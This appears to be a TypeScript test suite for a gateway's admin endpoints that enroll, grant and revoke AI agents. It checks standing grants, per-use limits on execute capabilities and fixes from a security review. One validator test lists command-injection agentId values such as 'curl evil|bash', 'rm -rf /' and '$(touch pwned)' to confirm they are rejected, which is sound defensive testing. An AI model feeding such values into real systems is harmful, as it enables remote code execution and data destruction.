/**
 * A3-ADMIN — the ADMIN side of "Connect an agent" (agent-skill-compile §3 step 1 + 4,
 * §5, Inv I/III, ADR-3/4/5).
 *
 * Proves the management-gated endpoints:
 *   - POST /admin/api/agents/connect  — mint a one-time enrollment code + grant the
 *     selected cap-set to the agent as STANDING grants (the admin grant IS the human
 *     approval, done once at admin-time). Returns the code for the console's install cmd.
 *   - POST /admin/api/agents/revoke   — kill the agent's enrollment/PAT + invalidate its
 *     LIVE sessions + revoke its standing grants, IMMEDIATELY, per-agent blast radius.
 *
 * End-to-end proof:
 *   connect(A, [write-cap]) → redeem code → PAT → handshake → PUT /grants short-circuits
 *   (STANDING grant, no pending) → invoke works. Then REVOKE(A) and confirm (a) A's PAT no
 *   longer handshakes, (b) A's previously-live session is invalidated + its token dead,
 *   (c) a SECOND agent B's enrollment / sessions / grants are COMPLETELY unaffected.
 */

import { describe, it, expect, beforeEach, afterEach } from "bun:test";
import { mkdtempSync, rmSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";

import type {
  CapabilityEntry,
  CapabilityId,
  SourceRegistry,
  SourceModule,
  Transport,
  TransportKind,
  CapabilityBridge,
  BridgeDeps,
  InvokeRequest,
  InvokeContext,
  InvokeResponse,
  HandshakeResponse,
  ScopedToken,
  GrantResponse,
} from "@plexus/protocol";
import { createAppWithState } from "@plexus/runtime/core/server.ts";
import { createCapabilityRegistry } from "@plexus/runtime/core/capability-registry.ts";
import { loadConfig, expectedHost } from "@plexus/runtime/config.ts";
import { _resetSecretCacheForTests } from "@plexus/runtime/auth/index.ts";

// A WRITE-ONLY first-party cap: a bare `"allow"` grant resolves to ["write"] (resolveVerbs
// returns the required set when it has no read), and WRITE pends under the default
// `confirm-risky` policy — so a token back from PUT /grants can ONLY mean the admin's
// STANDING grant short-circuited approval. A read cap rounds out the surface.
const WRITE_ENTRY: CapabilityEntry = {
  id: "mock.doc.write",
  source: "mock",
  kind: "capability",
  label: "Write a mock doc",
  describe: "Write a doc.",
  grants: ["write"],
  transport: "local-rest",
};
const READ_ENTRY: CapabilityEntry = {
  id: "mock.doc.read",
  source: "mock",
  kind: "capability",
  label: "Read a mock doc",
  describe: "Read a doc.",
  io: { input: { type: "object", properties: { path: { type: "string" } }, required: ["path"] } },
  grants: ["read"],
  transport: "local-rest",
};
// An EXECUTE cap (running code): GENUINELY-PER-USE (ADR-5 / Inv IV). Its recommended window
// is ALWAYS `once`, origin-independent — it can NEVER ride a standing grant, no matter what
// trust-window an admin supplies. Used to prove the F1 authoritative-path clamp.
const EXECUTE_ENTRY: CapabilityEntry = {
  id: "mock.script.run",
  source: "mock",
  kind: "capability",
  label: "Run a mock script",
  describe: "Execute a script.",
  grants: ["execute"],
  transport: "cli",
};
const MOCK_ENTRIES = [WRITE_ENTRY, READ_ENTRY, EXECUTE_ENTRY];

class MockBridge implements CapabilityBridge {
  readonly source = "mock";
  constructor(
    private readonly deps: BridgeDeps,
    private readonly sessionId: string,
  ) {}
  getCapabilities(): CapabilityEntry[] {
    return MOCK_ENTRIES;
  }
  route(id: CapabilityId) {
    return MOCK_ENTRIES.some((e) => e.id === id) ? ("handled" as const) : ("passthrough" as const);
  }
  async invoke(req: InvokeRequest, ctx: InvokeContext): Promise<InvokeResponse> {
    const entry = this.deps.getEntry(req.id)!;
    const audit = await this.deps.audit({
      type: "invoke",
      agentId: ctx.agentId ?? "",
      jti: ctx.jti,
      sessionId: ctx.sessionId,
      capabilityId: entry.id,
      verbs: entry.grants,
      outcome: "ok",
      detail: { transport: entry.transport },
    });
    return { id: entry.id, ok: true, output: { echoed: req.input ?? {} }, auditId: audit.id };
  }
  async disconnect(): Promise<void> {}
}

function mockRegistry(): SourceRegistry {
  const module: SourceModule = {
    id: "mock",
    label: "Mock",
    transport: "local-rest",
    createSource: () => {
      throw new Error("scan not used in these tests");
    },
    createBridge: (deps: BridgeDeps, sessionId: string) => new MockBridge(deps, sessionId),
  };
  return {
    all: () => [module],
    get: (id) => (id === "mock" ? module : undefined),
    getTransport: (kind: TransportKind) =>
      ({ kind, dispatch: async () => ({ ok: true }) }) as Transport,
  };
}

const config = loadConfig();
const HOST = expectedHost(config);

let home: string;
beforeEach(() => {
  home = mkdtempSync(join(tmpdir(), "plexus-a3-"));
  process.env.PLEXUS_HOME = home;
});
afterEach(() => {
  delete process.env.PLEXUS_HOME;
  rmSync(home, { recursive: true, force: true });
});

function freshApp() {
  _resetSecretCacheForTests();
  const sources = mockRegistry();
  const capabilities = createCapabilityRegistry(sources);
  for (const e of MOCK_ENTRIES)
    (capabilities as unknown as { entries: Map<string, CapabilityEntry> }).entries.set(e.id, e);
  return createAppWithState(config, { sources, capabilities });
}

type App = ReturnType<typeof freshApp>["app"];
type State = ReturnType<typeof freshApp>["state"];

function req(app: App, path: string, init?: RequestInit) {
  return app.request("http://" + HOST + path, {
    ...init,
    headers: { host: HOST, "content-type": "application/json", ...(init?.headers ?? {}) },
  });
}

/** POST /admin/api/agents/connect with the management key. */
async function connect(
  app: App,
  key: string,
  agentId: string,
  capabilities: string[],
  extra: Record<string, unknown> = {},
) {
  const res = await req(app, "/admin/api/agents/connect", {
    method: "POST",
    headers: { "x-plexus-connection-key": key },
    body: JSON.stringify({ agentId, capabilities, ...extra }),
  });
  return { status: res.status, body: (await res.json()) as any };
}

/** Redeem a code → PAT via the public agent enroll surface. */
async function enroll(app: App, code: string): Promise<string> {
  const res = await req(app, "/agents/enroll", { method: "POST", body: JSON.stringify({ code }) });
  const body = (await res.json()) as { pat?: string };
  if (!body.pat) throw new Error(`enroll failed: ${JSON.stringify(body)}`);
  return body.pat;
}

/** Handshake with a PAT → { sessionId }. */
async function handshake(app: App, pat: string) {
  const res = await req(app, "/link/handshake", {
    method: "POST",
    headers: { authorization: `Bearer ${pat}` },
    body: JSON.stringify({ client: { name: "cc" } }),
  });
  return { status: res.status, body: (await res.json()) as HandshakeResponse };
}

/** PUT /grants for a cap as the agent's session. */
async function putGrant(app: App, sessionId: string, capId: string): Promise<GrantResponse> {
  const res = await req(app, "/grants", {
    method: "PUT",
    headers: { "x-plexus-session": sessionId },
    body: JSON.stringify({ grants: { [capId]: "allow" } }),
  });
  return (await res.json()) as GrantResponse;
}

describe("A3-ADMIN — POST /admin/api/agents/connect", () => {
  it("mgmt-gated: without the connection-key it is 401 (never agent-reachable)", async () => {
    const { app } = freshApp();
    const res = await req(app, "/admin/api/agents/connect", {
      method: "POST",
      body: JSON.stringify({ agentId: "a", capabilities: [] }),
    });
    expect(res.status).toBe(401);
  });

  it("mints a one-time code AND grants the cap-set as STANDING (write via explicit opt-in)", async () => {
    const { app, state } = freshApp();
    const key = state.connectionKey.current();
    // A write is per-use by default at connect — the explicit `standing` opt-in is what
    // makes it a standing grant here (safe-by-default, owner config wins).
    const { status, body } = await connect(app, key, "agent-A", ["mock.doc.write"], {
      agentType: "claude-code",
      standing: ["mock.doc.write"],
    });
    expect(status).toBe(200);
    expect(body.ok).toBe(true);
    expect(body.agentId).toBe("agent-A");
    expect(body.agentType).toBe("claude-code");
    expect(body.code).toMatch(/^plx_enroll_/);
    expect(typeof body.expiresAt).toBe("string");
    expect(body.enrollUrl).toContain("/agents/enroll");
    // The write cap became a STANDING grant (7d), keyed to the real agentId.
    expect(body.granted).toHaveLength(1);
    expect(body.granted[0].capabilityId).toBe("mock.doc.write");
    expect(body.granted[0].standing).toBe(true);
    // And the enrollment row exists PENDING (code minted, not yet redeemed).
    expect(state.agentEnrollment.get("agent-A")?.status).toBe("pending");
    // The standing grant is on record (hasStanding recognizes it).
    expect(state.grants.get("agent-A", "mock.doc.write")?.standing).toBe(true);
  });

  it("A1: rejects an unsafe agentId (shell metacharacters / newline) with 400, mints NOTHING", async () => {
    const { app, state } = freshApp();
    const key = state.connectionKey.current();
    for (const agentId of ["x\ncurl evil|bash", "x; rm -rf /", "x$(touch pwned)", "x y", "x`id`"]) {
      const res = await req(app, "/admin/api/agents/connect", {
        method: "POST",
        headers: { "x-plexus-connection-key": key },
        body: JSON.stringify({ agentId, agentType: "generic", capabilities: [] }),
      });
      expect(res.status).toBe(400);
      // Nothing was provisioned for the malicious id (fail-fast BEFORE mint/grant).
      expect(state.agentEnrollment.get(agentId)).toBeUndefined();
    }
  });

  it("C4: an unknown agentType canonicalizes to `generic` (never stored verbatim)", async () => {
    const { app, state } = freshApp();
    const key = state.connectionKey.current();
    const { body } = await connect(app, key, "agent-codex", ["mock.doc.read"], { agentType: "codex" });
    // The response + the stored row carry the CANONICAL delivery type, not the raw `codex`.
    expect(body.agentType).toBe("generic");
    expect(state.agentEnrollment.get("agent-codex")?.agentType).toBe("generic");
  });

  it("rejects unknown capability ids up front (400, nothing minted)", async () => {
    const { app, state } = freshApp();
    const key = state.connectionKey.current();
    const res = await req(app, "/admin/api/agents/connect", {
      method: "POST",
      headers: { "x-plexus-connection-key": key },
      body: JSON.stringify({ agentId: "agent-bad", capabilities: ["mock.doc.write", "nope.nope"] }),
    });
    expect(res.status).toBe(400);
    // No enrollment row minted for the rejected connect.
    expect(state.agentEnrollment.get("agent-bad")).toBeUndefined();
  });

  it("STANDING grant short-circuits the agent's PUT /grants (no pending) → invoke works", async () => {
    const { app, state } = freshApp();
    const key = state.connectionKey.current();
    const { body: conn } = await connect(app, key, "agent-A", ["mock.doc.write"], {
      standing: ["mock.doc.write"],
    });
    const pat = await enroll(app, conn.code);
    const hs = await handshake(app, pat);
    expect(hs.status).toBe(200);
    const sessionId = hs.body.sessionId;

    // A WRITE grant would normally PEND under confirm-risky; the admin's STANDING grant
    // short-circuits → a ScopedToken comes straight back (no grant_pending_user).
    const grantRes = await putGrant(app, sessionId, "mock.doc.write");
    expect((grantRes as any).status).not.toBe("grant_pending_user");
    const token = (grantRes as ScopedToken).token;
    expect(typeof token).toBe("string");

    // The scoped token invokes the granted cap.
    const invRes = await req(app, "/invoke", {
      method: "POST",
      headers: { authorization: `Bearer ${token}`, "x-plexus-session": sessionId },
      body: JSON.stringify({ id: "mock.doc.write", input: { path: "x" } }),
    });
    expect(invRes.status).toBe(200);
    const inv = (await invRes.json()) as InvokeResponse;
    expect(inv.ok).toBe(true);
  });
});

describe("A3-ADMIN — POST /admin/api/agents/revoke (immediate, per-agent blast radius)", () => {
  it("kills enrollment + live sessions + grants for ONLY that agent; a second agent is untouched", async () => {
    const { app, state } = freshApp();
    const key = state.connectionKey.current();

    // Provision + fully connect TWO agents on the same gateway (writes opted into standing
    // so both hold live standing grants for the blast-radius assertions below).
    const { body: connA } = await connect(app, key, "agent-A", ["mock.doc.write"], {
      standing: ["mock.doc.write"],
    });
    const { body: connB } = await connect(app, key, "agent-B", ["mock.doc.write"], {
      standing: ["mock.doc.write"],
    });
    const patA = await enroll(app, connA.code);
    const patB = await enroll(app, connB.code);
    const hsA = await handshake(app, patA);
    const hsB = await handshake(app, patB);
    const sessA = hsA.body.sessionId;
    const sessB = hsB.body.sessionId;

    // Both short-circuit → each holds a live token over a LIVE session.
    const tokA = (await putGrant(app, sessA, "mock.doc.write")) as ScopedToken;
    const tokB = (await putGrant(app, sessB, "mock.doc.write")) as ScopedToken;
    expect(typeof tokA.token).toBe("string");
    expect(typeof tokB.token).toBe("string");
    expect(state.sessions.liveness(sessA).live).toBe(true);
    expect(state.sessions.liveness(sessB).live).toBe(true);

    // ── REVOKE agent-A ──────────────────────────────────────────────────────────
    const revRes = await req(app, "/admin/api/agents/revoke", {
      method: "POST",
      headers: { "x-plexus-connection-key": key },
      body: JSON.stringify({ agentId: "agent-A", reason: "test revoke" }),
    });
    expect(revRes.status).toBe(200);
    const rev = (await revRes.json()) as any;
    expect(rev.ok).toBe(true);
    expect(rev.enrollmentRevoked).toBe(true);
    expect(rev.sessionsInvalidated).toBeGreaterThanOrEqual(1);
    expect(rev.grantsRemoved).toBe(true);

    // (a) A's PAT no longer handshakes (enrollment/PAT killed).
    const hsAAgain = await handshake(app, patA);
    expect(hsAAgain.status).toBe(401);

    // (b) A's previously-live session is invalidated + its token is dead.
    expect(state.sessions.liveness(sessA).live).toBe(false);
    expect(state.grants.get("agent-A", "mock.doc.write")).toBeUndefined();
    const invA = await req(app, "/invoke", {
      method: "POST",
      headers: { authorization: `Bearer ${tokA.token}`, "x-plexus-session": sessA },
      body: JSON.stringify({ id: "mock.doc.write", input: { path: "x" } }),
    });
    const invABody = (await invA.json()) as InvokeResponse;
    expect(invABody.ok).toBe(false); // session invalidated / token revoked → denied

    // (c) agent-B is COMPLETELY unaffected: enrollment active, session live, grant intact,
    //     PAT still handshakes, token still invokes.
    expect(state.agentEnrollment.isActive("agent-B")).toBe(true);
    expect(state.sessions.liveness(sessB).live).toBe(true);
    expect(state.grants.get("agent-B", "mock.doc.write")?.standing).toBe(true);
    const hsBAgain = await handshake(app, patB);
    expect(hsBAgain.status).toBe(200);
    const invB = await req(app, "/invoke", {
      method: "POST",
      headers: { authorization: `Bearer ${tokB.token}`, "x-plexus-session": sessB },
      body: JSON.stringify({ id: "mock.doc.write", input: { path: "y" } }),
    });
    expect(invB.status).toBe(200);
    expect(((await invB.json()) as InvokeResponse).ok).toBe(true);
  });

  it("delete:true removes the enrollment row entirely (not a tombstone) — off the roster", async () => {
    const { app, state } = freshApp();
    const key = state.connectionKey.current();

    const { body: conn } = await connect(app, key, "agent-D", ["mock.doc.write"]);
    const pat = await enroll(app, conn.code);
    expect(state.agentEnrollment.isActive("agent-D")).toBe(true);

    const res = await req(app, "/admin/api/agents/revoke", {
      method: "POST",
      headers: { "x-plexus-connection-key": key },
      body: JSON.stringify({ agentId: "agent-D", delete: true }),
    });
    expect(res.status).toBe(200);
    const body = (await res.json()) as any;
    expect(body.ok).toBe(true);
    expect(body.enrollmentRevoked).toBe(true);
    expect(body.deleted).toBe(true);

    // The row is GONE — a plain revoke would leave a `status:"revoked"` tombstone here.
    expect(state.agentEnrollment.get("agent-D")).toBeUndefined();
    const enr = await req(app, "/admin/api/agents/enrollments", {
      headers: { "x-plexus-connection-key": key },
    });
    const enrBody = (await enr.json()) as any;
    expect(enrBody.agents.some((r: any) => r.agentId === "agent-D")).toBe(false);

    // PAT stays dead (fail-closed: no row ⇒ no auth).
    const hsAgain = await handshake(app, pat);
    expect(hsAgain.status).toBe(401);
  });

  it("mgmt-gated: revoke without the connection-key is 401", async () => {
    const { app } = freshApp();
    const res = await req(app, "/admin/api/agents/revoke", {
      method: "POST",
      body: JSON.stringify({ agentId: "agent-A" }),
    });
    expect(res.status).toBe(401);
  });
});

describe("SECURITY REGRESSIONS — connect/revoke path (adversarial review)", () => {
  // ── FINDING 1 (HIGH) — an admin-supplied trustWindow must NEVER make `execute` standing ──
  // `execute` (running code) is genuinely-per-use (ADR-5 / Inv IV): its recommended window is
  // always `once`, and `once` is a HARD ceiling admins cannot override. Before the fix,
  // chooseTrustWindow's authoritative branch returned the admin window verbatim, so an
  // `execute` cap connected with `trustWindow:{kind:"7d"}` persisted as STANDING and the
  // agent's PUT /grants short-circuited with NO per-use approval. This is the reviewer's repro.
  it("F1: EXECUTE cap connected with an admin trustWindow does NOT become standing (surfaces under `skipped`)", async () => {
    const { app, state } = freshApp();
    const key = state.connectionKey.current();
    const { status, body } = await connect(app, key, "agent-exec", ["mock.script.run"], {
      trustWindow: { kind: "7d" },
    });
    expect(status).toBe(200);
    // NOT under `granted` — an execute cap can't ride a standing grant.
    expect(body.granted).toHaveLength(0);
    // It surfaces under `skipped` (truthful "did not become standing") instead.
    expect(body.skipped).toContain("mock.script.run");
    // NOTHING standing is persisted for the execute cap, regardless of the 7d window.
    expect(state.grants.get("agent-exec", "mock.script.run")).toBeUndefined();
  });

  it("F1: the agent's PUT /grants for that EXECUTE cap PENDS (no short-circuit, per-use approval)", async () => {
    const { app, state } = freshApp();
    const key = state.connectionKey.current();
    const { body: conn } = await connect(app, key, "agent-exec", ["mock.script.run"], {
      trustWindow: { kind: "7d" },
    });
    const pat = await enroll(app, conn.code);
    const hs = await handshake(app, pat);
    const sessionId = hs.body.sessionId;
    // With NO standing grant, an execute PUT /grants must PEND (grant_pending_user) — it did
    // NOT short-circuit into a ScopedToken the way a genuine standing grant would.
    const grantRes = await putGrant(app, sessionId, "mock.script.run");
    expect((grantRes as any).status).toBe("grant_pending_user");
    expect((grantRes as any).token).toBeUndefined();
  });

  // Proof we did NOT over-clamp: a WRITE cap the owner OPTED INTO STANDING with an
  // admin-supplied trustWindow STILL gets its authoritative window (its default is 1d;
  // the admin's 7d must be honored, not clamped). Without the opt-in a write never
  // stands at connect at all (safe-by-default — see authz-subset S7).
  it("F1: opted-in WRITE cap KEEPS its authoritative standing window (7d, not clamped)", async () => {
    const { app, state } = freshApp();
    const key = state.connectionKey.current();
    const { status, body } = await connect(app, key, "agent-write", ["mock.doc.write"], {
      standing: ["mock.doc.write"],
      trustWindow: { kind: "7d" },
    });
    expect(status).toBe(200);
    expect(body.granted).toHaveLength(1);
    expect(body.granted[0].capabilityId).toBe("mock.doc.write");
    expect(body.granted[0].standing).toBe(true);
    // The admin's 7d window is authoritative (default write window is 1d) — proof the F1
    // clamp is per-use-only and does NOT blanket-clamp legitimate write windows.
    expect(body.granted[0].trustWindow.kind).toBe("7d");
    const g = state.grants.get("agent-write", "mock.doc.write");
    expect(g?.standing).toBe(true);
    expect(g?.trustWindow?.kind).toBe("7d");
  });

  // ── FINDING 2 (LOW-MED) — revoke must normalize agentId identically to connect ──
  // Chosen policy: TRIM (case-sensitive) on BOTH endpoints. connect("agent-Z") then
  // revoke(" agent-Z") (leading space) must tear the agent down, not silently no-op.
  it("F2: revoke with a whitespace-variant agentId still tears the agent down (trim on both paths)", async () => {
    const { app, state } = freshApp();
    const key = state.connectionKey.current();
    // Fully provision agent-Z so its enrollment is ACTIVE + it holds a live session/token.
    const { body: conn } = await connect(app, key, "agent-Z", ["mock.doc.write"], {
      standing: ["mock.doc.write"],
    });
    const pat = await enroll(app, conn.code);
    const hs = await handshake(app, pat);
    const sessZ = hs.body.sessionId;
    await putGrant(app, sessZ, "mock.doc.write");
    // The stored key is the TRIMMED id; the agent is live end-to-end.
    expect(state.grants.get("agent-Z", "mock.doc.write")?.standing).toBe(true);
    expect(state.agentEnrollment.isActive("agent-Z")).toBe(true);
    expect(state.sessions.liveness(sessZ).live).toBe(true);

    // Revoke with a LEADING SPACE — normalized identically (trim) → same key → real teardown.
    const revRes = await req(app, "/admin/api/agents/revoke", {
      method: "POST",
      headers: { "x-plexus-connection-key": key },
      body: JSON.stringify({ agentId: " agent-Z" }),
    });
    expect(revRes.status).toBe(200);
    const rev = (await revRes.json()) as any;
    expect(rev.ok).toBe(true);
    expect(rev.agentId).toBe("agent-Z"); // response echoes the normalized id
    expect(rev.enrollmentRevoked).toBe(true);
    expect(rev.grantsRemoved).toBe(true);
    // The agent is actually dead — grant removed, enrollment inactive, session invalidated.
    expect(state.grants.get("agent-Z", "mock.doc.write")).toBeUndefined();
    expect(state.agentEnrollment.isActive("agent-Z")).toBe(false);
    expect(state.sessions.liveness(sessZ).live).toBe(false);
  });

  // ── FINDING 4 (LOW) — connect is atomic-ish: a mint failure leaves NO orphan grants ──
  // The enrollment code is minted BEFORE any standing grant is persisted, so if minting throws
  // the request fails (500) with nothing persisted — never leaving standing grants behind for
  // an agent that can't enroll.
  it("F4: a mint failure leaves NO orphan standing grants (mint-first atomicity)", async () => {
    const { app, state } = freshApp();
    const key = state.connectionKey.current();
    // Force the enrollment mint to throw (simulate an enrollment-store failure).
    const orig = state.agentEnrollment.mintEnrollmentCode.bind(state.agentEnrollment);
    (state.agentEnrollment as any).mintEnrollmentCode = () => {
      throw new Error("simulated enrollment-store failure");
    };
    try {
      const res = await req(app, "/admin/api/agents/connect", {
        method: "POST",
        headers: { "x-plexus-connection-key": key },
        body: JSON.stringify({ agentId: "agent-F4", capabilities: ["mock.doc.write"] }),
      });
      // The request fails (mint threw before any grant was persisted).
      expect(res.status).toBeGreaterThanOrEqual(500);
    } finally {
      (state.agentEnrollment as any).mintEnrollmentCode = orig;
    }
    // NO orphan standing grant persisted for the un-enrollable agent.
    expect(state.grants.get("agent-F4", "mock.doc.write")).toBeUndefined();
    expect(state.grants.forAgent("agent-F4")).toHaveLength(0);
  });
});
